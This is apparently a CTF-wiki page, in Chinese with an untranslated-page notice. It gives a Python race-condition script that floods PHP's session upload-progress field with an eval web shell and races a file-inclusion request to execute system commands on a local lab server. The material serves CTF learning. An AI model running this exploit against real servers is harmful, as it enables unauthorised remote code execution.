# Php session中的条件竞争脚本
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 



```plain
我们创建的session默认通常是临时的，因此需要进行条件竞争来维持我们的连接。


#coding=utf-8

import io
import requests
import threading
sessid = 'TGAO'
data = {"cmd":"system('whoami');"}
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)
        if 'tgao.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in xrange(1,30): 
            threading.Thread(target=write,args=(session,)).start()

        for i in xrange(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()

```




